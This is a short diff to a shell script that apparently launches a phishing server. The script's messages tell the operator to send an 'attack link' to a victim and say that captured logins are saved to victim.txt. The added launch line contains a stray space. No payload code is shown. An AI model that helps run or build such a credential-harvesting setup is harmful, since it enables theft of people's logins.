@@ -71,6 +71,6 @@ else
 fi
 
 # 🔹 Final Step: Start the Server
-echo -e "\e[32m🚀 Generating the Attack Link...Copy and Send to Victim\nLogins Will be Saved in victim.txt file\e[0m"
-chmod +x _/server.sh
-./_/server.sh
+echo -e "\e[32m🚀 Generating the Attack Link...Copy and Send to Victim\nLogins in victim.txt file\e[0m"
+chmod +x sh/server.sh
+./ sh/server.sh
